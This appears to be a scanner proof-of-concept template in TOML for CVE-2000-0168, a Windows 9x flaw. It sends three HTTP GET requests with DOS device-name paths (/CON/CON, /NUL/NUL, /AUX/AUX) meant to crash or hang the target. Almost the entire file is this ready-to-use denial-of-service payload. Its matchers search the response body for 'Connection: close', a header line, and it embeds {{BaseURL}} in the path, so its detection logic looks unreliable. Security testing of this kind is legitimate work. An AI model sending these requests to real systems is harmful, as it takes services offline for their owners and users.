[info]
author = "ave"
description = "通过向 Windows 9x 系统上的 Web 服务发送包含 DOS 设备名（如 CON、NUL、AUX）的特制 HTTP 请求路径，触发系统对设备名路径的异常处理，导致蓝屏崩溃或系统挂起，造成拒绝服务。"
id = "POC-AVE-2000-0148"
name = "Microsoft Windows 9x DOS Device Name Path DoS PoC"
severity = "medium"
tags = ["ave-2000-0148"]
vuln_id = [
    "CVE-2000-0168",
    "AVE-2000-0148",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/CON/CON"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Connection: close",
    "Service Unavailable",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/NUL/NUL"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Connection: close",
    "Service Unavailable",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/AUX/AUX"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Connection: close",
    "Service Unavailable",
]
